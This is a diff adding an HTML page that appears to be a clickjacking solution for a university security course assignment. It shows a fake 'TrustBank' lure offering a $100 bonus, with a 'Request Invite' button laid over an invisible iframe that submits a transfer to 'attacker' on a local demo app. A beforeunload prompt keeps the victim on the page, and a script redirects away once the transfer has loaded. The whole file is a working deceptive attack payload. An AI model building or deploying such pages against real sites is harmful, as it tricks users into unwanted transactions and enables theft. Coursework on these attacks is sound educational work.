@@ -1,0 +1,41 @@
+<html>
+  <head>
+      <title>C</title>
+
+  </head>
+
+  <body>
+  <script>
+window.onbeforeunload = function() {
+  return "Do you want to exit TrustBank?";
+}
+</script>
+  <div style="position: absolute; left: 23px; top: 0px; ">
+  <h1 id="welcome">Welcome to TrustBank</h1>
+  <h3>We are launching the most secure online banking portal in the world!!</h3>
+  <p>Keeping your assets safe and your account information private is our top priority.</p>
+  <h4>Our Security Measures:</h4>
+  <ul>
+  	<li><strong>Safeguards</strong> - All of our safeguards meet or exceed the industry standards for Internet security.</li>
+  	<li><strong>Encryption Technology</strong> - Prevents anyone from intercepting or viewing your personal information.</li>
+  </ul>
+  <p>The first 200 users will recieve <strong>$100</strong> each when opening an account with us.</p>
+  <p>Hurry! limited time offer, click the link below to request for an invite.</p></div>
+  <div style="position: absolute; left: 14px; top: 343px; "><button>Request Invite</button></div>
+
+  <iframe id="attackframe" style="opacity: 0" height="545" width="680" scrolling="no" src="http://localhost:3000/protected_transfer?quantity=10&user=attacker" onLoad="redirect()"></iframe>
+
+<script>
+loadCount = 0;
+function redirect(){
+  loadCount = loadCount + 1;
+  if (loadCount == 2) {
+    window.onbeforeunload = null;
+    window.location = "http://pages.cs.wisc.edu/~rist/642-fall-2014/";
+  }
+}
+</script>
+  </body>
+
+
+</html>
